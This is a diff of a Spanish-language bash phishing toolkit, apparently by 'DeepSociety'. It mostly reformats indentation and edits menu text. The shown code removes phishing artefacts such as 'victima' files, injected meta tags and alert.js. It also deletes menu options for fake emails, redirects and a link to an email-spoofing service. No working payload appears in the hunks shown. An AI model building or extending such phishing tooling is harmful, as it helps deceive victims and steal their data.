@@ -16,7 +16,7 @@ s="m"
 bcolor="\e[1;3$crnd$s"
 #Banners
 dev(){
-echo -e "\e[1;92m				  create by\e[1;39m > DeepSociety"
+echo -e "\e[1;92m                                 create by\e[1;39m > DeepSociety"
 }
 
 
@@ -57,8 +57,8 @@ echo -e "$a[$b 1$v ]$b ChicasHot      [$b 00$v ]$b Salir"
 }
 finish() {
 
-	if [[ -f ngrok ]];then
-	if [[ -d $ruta_carpeta/images ]];then
+        if [[ -f ngrok ]];then
+        if [[ -d $ruta_carpeta/images ]];then
         rm -rf $ruta_carpeta/images
         fi
         if [[ -f $ruta_carpeta/alert.js ]];then
@@ -67,16 +67,16 @@ finish() {
         if [[ -f $ruta_carpeta/email ]];then
         rm $ruta_carpeta/email
         fi
-	if [[ -f $ruta_carpeta/pr1 ]];then
-	rm $ruta_carpeta/pr1
-	fi
-	if [[ -f $ruta_carpeta/pr2 ]];then
+        if [[ -f $ruta_carpeta/pr1 ]];then
+        rm $ruta_carpeta/pr1
+        fi
+        if [[ -f $ruta_carpeta/pr2 ]];then
         rm $ruta_carpeta/pr2
         fi
-	if [[ -f $ruta_carpeta/pr3 ]];then
+        if [[ -f $ruta_carpeta/pr3 ]];then
         rm $ruta_carpeta/pr3
         fi
-	if [[ -f $ruta_carpeta/pr4 ]];then
+        if [[ -f $ruta_carpeta/pr4 ]];then
         rm $ruta_carpeta/pr4
         fi
         if [[ -f $ruta_carpeta/hola ]];then
@@ -85,10 +85,10 @@ finish() {
         if [[ -f $ruta_carpeta/victima ]];then
         rm $ruta_carpeta/victima
         fi
-	sed -i "/<meta property='og:.*' content='.*'/d" ./$ruta_carpeta/index.html
+        sed -i "/<meta property='og:.*' content='.*'/d" ./$ruta_carpeta/index.html
         sed -i "/<script src='alert.js'/d" ./$ruta_carpeta/index.html
-	else
-	if [[ -d images ]];then
+        else
+        if [[ -d images ]];then
         rm -rf images
         fi
         if [[ -f alert.js ]];then
@@ -100,16 +100,16 @@ finish() {
         if [[ -f hola ]];then
         rm hola
         fi
-	if [[ -f pr1 ]];then
-	rm pr1
-	fi
-	if [[ -f pr2 ]];then
+        if [[ -f pr1 ]];then
+        rm pr1
+        fi
+        if [[ -f pr2 ]];then
         rm pr2
         fi
-	if [[ -f pr3 ]];then
+        if [[ -f pr3 ]];then
         rm pr3
         fi
-	if [[ -f pr4 ]];then
+        if [[ -f pr4 ]];then
         rm pr4
         fi
         if [[ -f victima ]];then
@@ -117,7 +117,7 @@ finish() {
         fi
         sed -i "/<meta property='og:.*' content='.*'/d" ./index.html
         sed -i "/<script src='alert.js'/d" ./index.html
-	fi
+        fi
 }
 
 options(){
@@ -733,19 +733,10 @@ sed -i "/<script src='alert.js'/d" ./index.html
 menu_options(){
 clear
 echo -e $bcolor
-$banner
 echo -e "$v[$b*$v] Pagina:$b $web"
-echo -e "$v[$b*$v] Idioma:$b $op"
+echo -e "$v[$b*$v] Inicia La Diversion:$b $op"
 echo -e "$v[$b*$v] Tunnel:$b $tunnel2"
 menu_agregados
-echo -e "$v[$b*$v]$b Mas opciones:\n"
-echo -e "$a[$b 1$v ] Mostrar titulo"
-echo -e "$a[$b 2$v ] Mostrar imagen"
-echo -e "$a[$b 3$v ] Mostrar descripción"
-echo -e "$a[$b 4$v ] Mostrar una mini url"
-echo -e "$a[$b 5$v ] Mostrar alert box(Puede causar errores)"
-echo -e "$a[$b 6$v ] Redireccionar"
-echo -e "$a[$b 7$v ] Enviar correo falso\n"
 echo -e "$a[$b*$v]$b Para enpezar:\n"
 echo -e "$v[$b*$v]$b Escribe run o start.\n"
 }
@@ -900,13 +891,10 @@ fi
 elif [[ $addopc == "run" || $addopc == "Run" || $addopc == "start" || $addopc == "Start" ]];then
 clear
 echo -e $bcolor
-$banner
 echo -e "$v[$b*$v] Pagina:$b $web
 $v[$b*$v] Idioma:$b $op
 $v[$b*$v] Tunnel:$b $tunnel2"
 menu_agregados
-echo -e "$v[$b*$v] Puedes enviar un email falso:
-$v[$b*$v]$b https://emailspoofbyharris.000webhostapp.com"
 $tunnel2
 else
 echo -e "\n$r[!]$b Opción invalida > $addopc"
